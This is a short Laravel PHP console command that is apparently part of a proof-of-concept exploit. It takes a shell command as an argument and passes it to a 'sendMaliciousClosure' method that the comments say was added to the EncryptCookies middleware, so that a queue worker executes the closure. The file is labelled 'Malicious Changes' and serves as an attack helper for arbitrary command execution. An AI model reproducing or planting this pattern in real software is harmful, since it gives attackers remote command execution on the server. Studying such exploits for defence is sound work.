<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use App\Http\Middleware\EncryptCookies;

class exploitClosure extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'command:exploitClosureWrongScope  {cmd}';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Command description';

    /**
     * Execute the console command.
     *
     * @return int
     */
    public function handle() // Malicious Changes
    {
        $cmd = $this->argument('cmd');
        echo "sending closure with Command:" . $cmd . "\n";
        /* The queue handler expects an object whith a scope that definetly exists
        thats why we modify App\Http\Middleware\EncryptCookies.php to sent our closure from there.
        
        If we would sent it from here, the scope would not exist and the queue handler would not be able to call it.
        
        We could use reflection to have the proper scope, but we're lazy.

         */
        
        EncryptCookies::sendMaliciousClosure($cmd);
        return 0;
    }
}
